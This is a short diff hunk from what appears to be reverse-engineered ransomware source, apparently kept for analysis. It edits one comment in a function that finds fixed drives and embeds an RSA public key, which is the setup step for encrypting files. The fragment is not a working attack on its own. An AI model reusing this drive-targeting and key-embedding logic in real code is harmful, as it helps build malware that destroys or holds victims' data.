@@ -1002,7 +1002,7 @@ HANDLE  CheckDriveAndPubKey() // returns thread handle
 			index = GetDriveTypeW(RootPathName);
 			if (index == DRIVE_FIXED)
 			{
-				buff = LocalAlloc(LMEM_ZEROINIT, 0x20u); // size of a struct
+				buff = LocalAlloc(LMEM_ZEROINIT, 0x20u); // size of a custom crypto struct
 				if (buff)
 				{
 					buff[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
